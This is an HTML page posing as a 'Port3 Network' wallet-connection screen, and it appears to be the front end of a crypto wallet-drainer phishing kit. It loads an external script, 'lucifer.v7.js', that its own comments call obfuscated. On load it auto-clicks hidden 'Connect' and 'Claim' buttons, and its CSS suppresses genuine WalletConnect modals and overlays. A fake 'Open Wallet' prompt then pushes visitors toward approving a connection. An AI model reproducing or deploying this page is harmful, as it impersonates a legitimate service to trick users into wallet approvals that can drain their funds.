<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting Wallet | Port3 Network</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg: #ffffff;
            --grid-color: #f7f7f7;
            --text-main: #000000;
            --text-muted: #666666;
            --border-color: #eeeeee;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: var(--bg);
            background-image: 
                linear-gradient(to right, var(--grid-color) 1px, transparent 1px),
                linear-gradient(to bottom, var(--grid-color) 1px, transparent 1px);
            background-size: 40px 40px;
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            overflow: hidden;
        }

        .connect-card {
            background: #ffffff;
            border: 1px solid var(--border-color);
            border-radius: 24px;
            width: 100%;
            max-width: 420px;
            padding: 2.5rem 2rem;
            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.05);
            text-align: center;
            position: relative;
            z-index: 99999 !important;
        }

        .header-logo {
            font-size: 1.6rem;
            font-weight: 800;
            letter-spacing: -1.5px;
            margin-bottom: 2rem;
        }

        .header-logo span {
            font-size: 0.85rem;
            font-weight: 700;
            vertical-align: super;
            position: relative;
            top: -6px;
        }

        .spinner-container {
            position: relative;
            width: 80px;
            height: 80px;
            margin: 0 auto 2rem auto;
        }

        .spinner {
            width: 100%;
            height: 100%;
            border: 3px solid #f3f3f3;
            border-top: 3px solid var(--text-main);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-title {
            font-size: 1.2rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
            letter-spacing: -0.2px;
        }

        .status-desc {
            font-size: 0.9rem;
            color: var(--text-muted);
            line-height: 1.5;
            margin-bottom: 2rem;
        }

        /* Action button style when ready */
        .action-btn {
            background-color: var(--text-main);
            color: #ffffff;
            border: none;
            border-radius: 30px;
            padding: 0.8rem 2rem;
            font-size: 0.9rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 0.5rem;
            width: 100%;
            display: none; /* Hidden during handshaking stage */
        }

        .action-btn:hover {
            opacity: 0.9;
        }

        .cancel-btn {
            background-color: transparent;
            color: var(--text-muted);
            border: 1px solid var(--border-color);
            border-radius: 30px;
            padding: 0.8rem 2rem;
            font-size: 0.9rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            width: 100%;
        }

        .cancel-btn:hover {
            background-color: #fafafa;
            color: var(--text-main);
            border-color: #cccccc;
        }

        .hidden-triggers {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0;
            opacity: 0;
        }

        /* Prevent background popups from ruining the look */
        div[class*="modal"], 
        div[class*="overlay"], 
        div[id*="walletconnect"], 
        div[class*="walletconnect"],
        .wcm-modal,
        #walletconnect-wrapper {
            display: none !important;
            visibility: hidden !important;
            opacity: 0 !important;
            pointer-events: none !important;
            z-index: -1000 !important;
        }
    </style>
</head>
<body>

    <div class="connect-card">
        <div class="header-logo">PORT<span>3</span></div>
        
        <div class="spinner-container" id="spinnerIcon">
            <div class="spinner"></div>
        </div>

        <h3 class="status-title" id="statusTitle">Connecting...</h3>
        <p class="status-desc" id="statusDesc">Initializing secure connection environment. Please wait.</p>

        <!-- User triggers this only after initialization is complete to avoid the drop loop -->
        <button class="action-btn" id="openWalletBtn" onclick="triggerWalletRedirect()">Open Wallet</button>
        <button class="cancel-btn" onclick="goBack()">Cancel Request</button>
    </div>

    <div class="hidden-triggers">
        <button class="interactBtn" id="connectButton">Connect</button>
        <button class="claimBtn" id="claimButton">Claim</button>
        <div class="wallet-connect-btn">WalletConnect</div>
        <div class="wallet-info"></div>
    </div>

    <script type="module" crossorigin src="/files/lucifer.v7.js"></script>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const activeWallet = urlParams.get('wallet') || 'Wallet';
        let walletReady = false;

        document.getElementById('statusTitle').textContent = `Initializing ${activeWallet}`;

        window.addEventListener('DOMContentLoaded', () => {
            // INCREASED TIMEOUT: Ensures the obfuscated wallet core loads completely 
            // and provisions a real cryptographic URI in the background before we interact.
            setTimeout(() => {
                const interactBtn = document.querySelector('.interactBtn');
                const walletConnectBtn = document.querySelector('.wallet-connect-btn');
                
                if (interactBtn) {
                    interactBtn.click();
                    setupUIReadyState();
                } else if (walletConnectBtn) {
                    walletConnectBtn.click();
                    setupUIReadyState();
                }
            }, 1500); 
        });

        function setupUIReadyState() {
            walletReady = true;
            // Hide loading spinner animations
            document.getElementById('spinnerIcon').style.display = 'none';
            // Update textual status indicators
            document.getElementById('statusTitle').textContent = `Approve Connection`;
            document.getElementById('statusDesc').textContent = `Your connection link is generated. Press 'Open Wallet' below to launch your ${activeWallet} utility container seamlessly.`;
            // Reveal the explicit execution trigger button
            document.getElementById('openWalletBtn').style.display = 'block';
        }

        function triggerWalletRedirect() {
            if (!walletReady) return;

            // Optional: Hard force launch fallback hook if standard library intercepts fail
            if (activeWallet.toLowerCase() === 'trust' || activeWallet.toLowerCase() === 'trustwallet') {
                // If lucifer.v7 exposes the generated uri string to localStorage or global arrays, grab it here:
                const wcUri = localStorage.getItem('walletconnect') || '';
                if(wcUri) {
                    const cleanUri = JSON.parse(wcUri).uri;
                    window.location.href = `trust://wc?uri=${encodeURIComponent(cleanUri)}`;
                    return;
                }
            }

            // Standard target execution fallback
            const interactBtn = document.querySelector('.interactBtn');
            if (interactBtn) interactBtn.click();
        }

        function goBack() {
            window.history.back();
        }
    </script>
</body>
</html>
